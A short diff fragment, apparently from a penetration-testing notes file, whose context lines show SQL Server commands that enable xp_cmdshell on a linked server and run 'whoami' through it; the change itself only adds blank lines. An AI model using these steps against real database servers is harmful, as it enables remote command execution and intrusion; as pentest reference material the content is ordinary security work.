@@ -18,3 +18,5 @@ SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
 SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
 SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 ```
+
+
